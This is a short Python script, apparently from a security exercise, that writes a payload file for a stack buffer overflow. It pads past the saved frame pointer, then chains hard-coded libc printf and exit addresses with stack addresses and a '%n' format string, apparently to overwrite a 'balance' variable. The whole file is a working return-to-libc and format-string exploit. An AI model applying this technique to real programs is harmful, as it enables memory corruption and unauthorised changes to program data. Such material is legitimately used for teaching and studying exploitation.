#!/usr/bin/python

padding = 88 # difference between $ebp and &buf
padding_past_ebp = padding + 4
printf_addr = "\x60\x9c\xe3\xf7"
exit_addr = "\x60\x90\xe1\xf7"
fmt_addr = "\xd0\xd2\xff\xff"
balance_256_addr = "\x51\xd3\xff\xff"
balance_addr = "\x50\xd3\xff\xff"
# string contents written without little endian.
fmt_str = "%n%s\n"

with open('abc', 'wb') as f:
    f.write(" " * padding_past_ebp \
            + printf_addr \
            + exit_addr \
            + fmt_addr \
            + balance_256_addr \
            + balance_addr \
            + fmt_str)
